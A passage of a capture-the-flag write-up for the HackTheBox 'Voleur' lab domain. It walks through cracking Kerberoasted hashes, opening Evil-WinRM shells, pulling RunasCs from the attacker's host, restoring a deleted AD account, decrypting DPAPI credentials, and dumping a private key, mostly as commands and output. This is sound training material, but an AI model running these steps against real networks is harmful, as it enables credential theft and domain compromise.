$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$acd2466540af577d5c637c3f0ed02f2b$6fd82c5d2930a9713281f03831531a03bb9330740f3fd3b6e6fee0970aea9d5ccc0852113dedd440e1b5e908644aa7887a6cedd96c6a1e7bfae6409b34f2e3f6ec955829fcbeb983b59de013317ac64bc29062b925afeeca69f46e423fe5366489cacb53b273e340c08e4e346e2bc010ae12bb02ff884778666fa69c70045f2447594a0c3c756b72f196980c0dc8bc45fc5f416fe6d885a060975978cf9eeb23940ac423757aaa04722a38d02e9df08dd473be7e3d4b9d6cde7f9975d0af2ed9377269b8068d32a1baad08bcad50cb5371a3c95c6f213fb4fcc190b5c25eb1469492dff0abb9ceb0fc0a569f2d55672239d6ba1554578bed3be105c1f578273acbd250df000afc02713658d5afd7beb3c2b88d0163901455749a04881ce713baceda264bcede3d41ac166b84f31d1e2dcb8cf4b7e994eadafce2dc2615ae83df8948741f2bf4c1b2a3b1f41590b09b212c1b21a4ec3becbbecb59776afa7e937545fe92fb1bfc8d48548eae1a9549bb5ef0442c77ca22c2ef85472215f1c3c7ce9a11330bb62c09aba57f1e668948cd79baa2fbe9214257fa5e9f25be480d0f2b9f65f84b35321e78a66960b77ab0faccaa542a2b2464f7eebdb6f62f9c820c9455d053ecd973fac5e73fefbbc023c9dde16afeace1bc722da2df7e1a3f1f9cfd98754b7b6f4738791b69204faf2d61420e1f42a141f60bd3deb3dde18f94a4f8c65d27ab592feca004ce1d7513e5d02c6941140fa34df789477963c59d80f385a1a59b5ca10493cf06259c177d5704d28f94ce165c8055602907f51b92dae2d8016752b196829952f626a81da8ff9c999f1c669c0999913f82dd2612ec8c3e5ac7bae507a5af45d5a0a2faa57177d0aef770d0909f85c523b2d37e342b4fcbf63dde493b5ebd5e5b6a8d7511402609602c2a6c606f9c47f682ae2263a5674b4333fa1f14198a2614651a59f1e7392035ef5ac6d7074a607fe122b54a670dbb5713774580c1256816734c456989c7ec036025d25c228dd8908d7fa6c4ef689a3681f04ffe9d0b18e68be0c8a4bc3e9fe1a358faf43500e434230d33a67ba796aea625fbffb1811629499a2147bd32ce1cc98478e5c0d31f460ec39e66263e54faff7c16fc498ab713758605866344c9bb94cdd852106a8122182f81e1b833c01b140e7c8cf21bda6e7584fbf81bf1ca2c31573c6cbc92241900b06e6f69ed3e6c3da67214ddce92c9a9f2315ffc18a2f76894f0c36c142e560184d139e19ef0fc1c36935d88f092fb7a35260f352e2fd0d3a0b24d562f9a9c75116d97f95462dd7db7a6bdf9cee0e363163c4f0da5b015a38510d146642406a802e5f06119dd6c4403c2a3799184e4d86e30440caa968d973f13edf59e3749858f5365d81b817bf71801b9f41dc935d9ce65f8b3048d2a428bf529e9ac41c25033c971a2ea0e9c48444894ee9f62e45f9ad3a50bdfb392fe744
EOF

$ cat << 'EOF' > lacey.miller
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$459a8511c7551bbdbbbbe0629b1366b8$ee5e26bf666a225ee64eba58d5b51135a29fc19f3be9ff7aa9f14cc8720c38d95ddd4e21f680c0dd95d873e3cad62d3cdff79c208644c1b3a61620b4155bb4c6e6753d6842d9d6ee9db4d8fa4f9f1ded48397dac1630a6093ed5cec4e1c6180d031f1d682a3dbe20f3f793afdccbc171c7014e93fc58e4c789ab4169c931ae1582fa491c81ad395fda073d4fe8a3657bf0555b52b8f7ea95d0d5ef9c04aca38419785c3a732c2ce82e292a0744f72484e38be828a392194a2a4bf347fa368d8d6944732b148c347b0b6812bc10be65fba80b9350838f061d8d11eaec2827a38aed5c9fbf388c97b6ca71d75343c80ba23cf65334dbb5cc3197150a2dc3e3c1ea112a1389bd100490c1dc3b22caf1b6ef805af1b2803c417a77257f8225aac48cee0a6ae69795c02fc228522a272a7912a6d54dc078bfa244b879879f2eb09f72276c779baa7f79d9f3de404e1db51767f054ddb5e373b3e2c30ee9c6d7e7d1744a4496ebbdead1aa8ada8c77bce76a36fc5c8799fceb0792f41f9de2b006e4eea25ba5c262dd523051bf9240884bc1e9fd3f30391f1cb93a4737eab4e0f1b72f5e4469b8ecb1bedb006ce17f61f62aca7a38c2bf4605bfd629c9713f2c350d775d599dd3cf16bf00dda78d8ad905c5af2cb3f100ca370cef070f88234af99436ee0818a0b0cb9b471ca10483b33abdb5faf39db30f1cb96e77a1c0d35841455346b9765d4760bfe0095103606751b4420db2fa2502e6f1fae907334d3458b2c7bc315c05112c20b20940fe7e4f0017a980ce972fc07e70193d21d90ab3eed55dac416b62fd525a3becba266e7c8a15eb79048b9be031d99da2215ba0fa95648ba1bab0881de12ff8daed1137efa7e513427c57ae89d3af342ca2338e02d70887b0dc8e8de6a2bea23d969007a107fc7c9897892802aaba2449dc8260f4881a6290d240af09255faf3f685bd28ada7027657f705bd5ae25a892fb48264a7698c7a7e4892c64d9ca55fb0c76d4acf2faad41ec096326cdf89d7a2304a36558e52c4c73f2c5e0181b74b4306b9fdd437df561e93c9bc807c30cf955cd5ca18794f8bf6108f1f2c60fda200b1a566eab3fba2fc9ef33b948fbfecc69c3e8fed26c1f788e6359d5ac5ae2bfa0d61ff2522a53c0c2bab72b257fe71dd9ebdf0e170dae17a845b887cf7227caa236f3887689c992af857b839974ac48f0800b8f4fb1d39f060bd098f4728c9989f0ec4f0386098e3a8cfb5e2618e7fe1a6ce9bd1841c644ac24bf01e04255d44f0c286c280318248d2ca85c733058cfac23c6d662a33a3f782a923a973ccaf0ca8532b9e010bd5c74e47da20d65efa68dd9c5e7850440d221916ad54fef22bf3e2c60c2817647f5515dd43920c3f898ceceeea48da3e5c4d2ec3398b6c6b9f86d8194d9a2cf161c93b0e2effab00042ab507828e690ae1fb3e4002d43a42c607a274031ab456ca20a73
EOF

$ hashcat -a 0 -m 13100 svc_winrm /usr/share/wordlists/rockyou.txt

<SNIP>

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$acd2466540af577d5c637c3f0ed02f2b$6fd82c5d2930a9713281f03831531a03bb9330740f3fd3b6e6fee0970aea9d5ccc0852113dedd440e1b5e908644aa7887a6cedd96c6a1e7bfae6409b34f2e3f6ec955829fcbeb983b59de013317ac64bc29062b925afeeca69f46e423fe5366489cacb53b273e340c08e4e346e2bc010ae12bb02ff884778666fa69c70045f2447594a0c3c756b72f196980c0dc8bc45fc5f416fe6d885a060975978cf9eeb23940ac423757aaa04722a38d02e9df08dd473be7e3d4b9d6cde7f9975d0af2ed9377269b8068d32a1baad08bcad50cb5371a3c95c6f213fb4fcc190b5c25eb1469492dff0abb9ceb0fc0a569f2d55672239d6ba1554578bed3be105c1f578273acbd250df000afc02713658d5afd7beb3c2b88d0163901455749a04881ce713baceda264bcede3d41ac166b84f31d1e2dcb8cf4b7e994eadafce2dc2615ae83df8948741f2bf4c1b2a3b1f41590b09b212c1b21a4ec3becbbecb59776afa7e937545fe92fb1bfc8d48548eae1a9549bb5ef0442c77ca22c2ef85472215f1c3c7ce9a11330bb62c09aba57f1e668948cd79baa2fbe9214257fa5e9f25be480d0f2b9f65f84b35321e78a66960b77ab0faccaa542a2b2464f7eebdb6f62f9c820c9455d053ecd973fac5e73fefbbc023c9dde16afeace1bc722da2df7e1a3f1f9cfd98754b7b6f4738791b69204faf2d61420e1f42a141f60bd3deb3dde18f94a4f8c65d27ab592feca004ce1d7513e5d02c6941140fa34df789477963c59d80f385a1a59b5ca10493cf06259c177d5704d28f94ce165c8055602907f51b92dae2d8016752b196829952f626a81da8ff9c999f1c669c0999913f82dd2612ec8c3e5ac7bae507a5af45d5a0a2faa57177d0aef770d0909f85c523b2d37e342b4fcbf63dde493b5ebd5e5b6a8d7511402609602c2a6c606f9c47f682ae2263a5674b4333fa1f14198a2614651a59f1e7392035ef5ac6d7074a607fe122b54a670dbb5713774580c1256816734c456989c7ec036025d25c228dd8908d7fa6c4ef689a3681f04ffe9d0b18e68be0c8a4bc3e9fe1a358faf43500e434230d33a67ba796aea625fbffb1811629499a2147bd32ce1cc98478e5c0d31f460ec39e66263e54faff7c16fc498ab713758605866344c9bb94cdd852106a8122182f81e1b833c01b140e7c8cf21bda6e7584fbf81bf1ca2c31573c6cbc92241900b06e6f69ed3e6c3da67214ddce92c9a9f2315ffc18a2f76894f0c36c142e560184d139e19ef0fc1c36935d88f092fb7a35260f352e2fd0d3a0b24d562f9a9c75116d97f95462dd7db7a6bdf9cee0e363163c4f0da5b015a38510d146642406a802e5f06119dd6c4403c2a3799184e4d86e30440caa968d973f13edf59e3749858f5365d81b817bf71801b9f41dc935d9ce65f8b3048d2a428bf529e9ac41c25033c971a2ea0e9c48444894ee9f62e45f9ad3a50bdfb392fe744:AFireInsidedeOzarctica980219afi

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_wi...2fe744
Time.Started.....: Fri May 15 06:09:06 2026 (4 secs)
Time.Estimated...: Fri May 15 06:09:10 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/tralsesec/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2593.4 kH/s (2.17ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11476992/14344385 (80.01%)
Rejected.........: 0/11476992 (0.00%)
Restore.Point....: 11468800/14344385 (79.95%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: AK78910 -> ABC523
Hardware.Mon.#01.: Util: 71%

Started: Fri May 15 06:09:05 2026
Stopped: Fri May 15 06:09:12 2026

$ hashcat -a 0 -m 13100 lacey.miller /usr/share/wordlists/rockyou.txt

<SNIP>

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lac...a20a73
Time.Started.....: Fri May 15 06:23:49 2026 (6 secs)
Time.Estimated...: Fri May 15 06:23:55 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/tralsesec/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2459.9 kH/s (2.24ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 71%

Started: Fri May 15 06:23:48 2026
Stopped: Fri May 15 06:23:56 2026
```

`svc_winrm`:`AFireInsidedeOzarctica980219afi`. Lacey's hash could not be cracked.

Now request a ticket:
```bash
$ impacket-getTGT voleur.htb/svc_winrm -dc-ip $IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:<AFireInsidedeOzarctica980219afi>
[*] Saving ticket in svc_winrm.ccache

$ export KRB5CCNAME=svc_winrm.ccache
```

Then `evil-winrm-py`:
```bash
$ evil-winrm -i dc.voleur.htb -r VOLEUR.HTB -K ./svc_winrm.ccache

Evil-WinRM shell v3.9

Warning: KRB5CCNAME is already set to: svc_winrm.ccache. Using existing value instead of /home/tralsesec/HackTheBox/boxes/Voleur/svc_winrm.ccache

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents>cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
[REDACTED]
```
> In case something fails, make sure to `export KRB5_CONFIG=$PWD/voleur.krb5` like before!

---

## 📈 3.2 Privilege Escalation (`svc_ldap` -> `todd.wolfe` -> `jeremy.combs`)

As we saw before in bloodhound, `svc_ldap` is member of the non-standard group `RESTORE_USERS` which grants `GenericWrite` on `lacey.miller`.

As we could not login as `svc_ldap` via `winrm` but as `svc_winrm`, we have to use `RunasCs` in order to execute commands as `svc_ldap` from `svc_winrm`'s session:
```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> iwr -uri http://10.10.14.219:1101/RunasCs/RunasCs.exe -outfile runas.exe
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\runas.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-ADObject -Filter 'isDeleted -eq `$true' -IncludeDeletedObjects -Properties distinguishedName, objectSid -SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'"
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.



Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
```

We see a deleted user: `Todd Wolfe`. We need to restore that user using the `Restore-ADObject` cmdlet to recover deleted directory objects from the Active Directory Recycle Bin:
```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\runas.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Restore-ADObject 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'"
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

No output received from the process.
```

We can confirm if the restoration was successful by checking the deleted objects again:
```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\runas.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-ADObject -Filter 'isDeleted -eq `$true' -IncludeDeletedObjects -Properties distinguishedName, objectSid -SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'"
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.



Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8
```

`Todd Wolfe` cannot be found anymore, so the restoration was successful!

`Todd Wolfe` was the user we found before in the `.xsls` that was crossed out. There was a password: `NightT1meP1dg3on14`. Hopefully it works so we can request a TGT:
```bash
$ impacket-getTGT voleur.htb/todd.wolfe -dc-ip $IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:<NightT1meP1dg3on14>
[*] Saving ticket in todd.wolfe.ccache
```

Indeed! We have to check what that user can access:
```bash
$ export KRB5CCNAME=todd.wolfe.ccache
$ nxc smb dc.voleur.htb -u todd.wolfe -p NightT1meP1dg3on14 -d VOLEUR.htb -k -M spider_plus -o DOWNLOAD_FLAG=True
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.htb\todd.wolfe:NightT1meP1dg3on14
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Started module spidering_plus with the following options:
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS dc.voleur.htb   445    dc               [*]     STATS_FLAG: True
SPIDER_PLUS dc.voleur.htb   445    dc               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  OUTPUT_FOLDER: /home/tralsesec/.nxc/modules/nxc_spider_plus
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Crashpad/metadata". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/ClientCertificates/LOCK". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/ClientCertificates/LOG". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/commerce_subscription_db/LOCK". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/commerce_subscription_db/LOG". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/discounts_db/LOCK". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/discounts_db/LOG". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/EdgeCoupons/coupons_data.db/LOCK". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/EdgeEDrop/EdgeEDropSQLite.db-journal". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/EdgeHubAppUsage/EdgeHubAppUsageSQLite.db-journal". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/EdgePushStorageWithConnectTokenAndKey/LOCK". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/EdgePushStorageWithConnectTokenAndKey/LOG". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS dc.voleur.htb   445    dc               [-] Failed to download file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Edge/User Data/Default/EdgePushStorageWithConnectTokenAndKey/LOG.old". Error: 'RemoteFile' object has no attribute 'get_filesize'

<SNIP>
```

For some reason `nxc` couldn't download the files automatically so we have to check it out manually:

```bash
$ impacket-smbclient -k todd.wolfe@dc.voleur.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:<NightT1meP1dg3on14>
Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# cd Second-Line Support
# cd Archived Users
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 15:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 16:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 13:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 13:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 13:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Videos
# cd AppData\Roaming\Microsoft\Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 14:13:50 2025 772275FAD58525253490A9B0039791D3
# cd *
[-] SMB SessionError: code: 0xc0000033 - STATUS_OBJECT_NAME_INVALID - The object name is invalid.
# cd 772275FAD58525253490A9B0039791D3
[-] SMB SessionError: code: 0xc0000103 - STATUS_NOT_A_DIRECTORY - A requested opened file is not a directory.
# get 772275FAD58525253490A9B0039791D3
# cd ..
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Windows
# cd Protect
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 13:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 13:53:08 2025 SYNCHIST
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 14:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 13:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 13:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
# exit
```

We have successfully extracted the two most important components for a DPAPI-Attack: The Credential-File (`772275FAD58525253490A9B0039791D3`) which is the encrypted credential itself and the Master-Key (`08949382-134f-4c63-b93c-ce52efc0aa88`) which is required to decrypt the Credential-File.

To decrypt:
```bash
$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

With this decrypted key we can easily unlock the credential file we downloaded:
```bash
$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

`jeremy.combs`:`qT3V9pLXyN7W4m`.

![voleur-5.htb](/assets/img/ctf/data/voleur-5.png)

```bash
$ impacket-getTGT voleur.htb/jeremy.combs -dc-ip $IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:<qT3V9pLXyN7W4m>
[*] Saving ticket in jeremy.combs.ccache

$ export KRB5CCNAME=jeremy.combs.ccache

$ evil-winrm -i dc.voleur.htb -r VOLEUR.HTB

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

---

## 📈 3.3 Privilege Escalation (`jeremy.combs` -> `svc_backup` -> `Administrator`)

As `jeremy.combs` let's see what else is in that `IT\Third-Line Support` share:
```powershell
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> cd "C:\IT\Third-Line Support"
*Evil-WinRM* PS C:\IT\Third-Line Support> ls


    Directory: C:\IT\Third-Line Support


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt
*Evil-WinRM* PS C:\IT\Third-Line Support> cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqFyPMvURW/qbyRlemAMzaPVvfR7JNHznL6xDHP4o/hqWIzn3dZ66
P2absMgZy2XXGf2pO0M13UidiBaF3dLNL7Y1SeS/DMisE411zHx6AQMepj0MGBi/c1Ufi7
rVMq+X6NJnb2v5pCzpoyobONWorBXMKV9DnbQumWxYXKQyr6vgSrLd3JBW6TNZa3PWThy9
wrTROegdYaqCjzk3Pscct66PhmQPyWkeVbIGZAqEC/edfONzmZjMbn7duJwIL5c68MMuCi
9u91MA5FAignNtgvvYVhq/pLkhcKkh1eiR01TyUmeHVJhBQLwVzcHNdVk+GO+NzhyROqux
haaVjcO8L3KMPYNUZl/c4ov80IG04hAvAQIGyNvAPuEXGnLEiKRcNg+mvI6/sLIcU5oQkP
JM7XFlejSKHfgJcP1W3MMDAYKpkAuZTJwSP9ISVVlj4R/lfW18tKiiXuygOGudm3AbY65C
